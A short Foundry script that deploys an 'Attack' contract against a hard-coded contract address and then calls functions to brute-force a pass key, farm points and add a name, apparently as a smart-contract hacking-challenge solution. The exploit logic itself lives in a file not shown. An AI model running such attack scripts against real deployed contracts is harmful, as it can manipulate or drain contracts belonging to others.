// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    function setUp() public {}

    function run() public {
        // uint private_key = vm.envUint("DEV_PRIVATE_KEY");
        // address account = vm.addr(private_key);
        // console.log("Account", account);

        // vm.startBroadcast(private_key);
        // THE ABOVE WAS MUTED BECAUSE THE PRIVATEKEY HAS BEEN ADDED TO THE TERMINAL COMMAND
        vm.startBroadcast();

        // Deploy Attack contract
        Attack attack = new Attack(address(0xeDBc81a4d20B616AFc6Acf43D2197f192049ca04));
        console.log("Contract deployed to: ", address(attack));

        // Call bruteForcePassKey
        attack.bruteForcePassKey();

        // Call getEnoughPoint four times
        for (uint i = 0; i < 4; i++) {
            attack.getEnoughPoint("pope_h");
        }

        // Call addYourName
        attack.addYourName();

        vm.stopBroadcast();
    }
}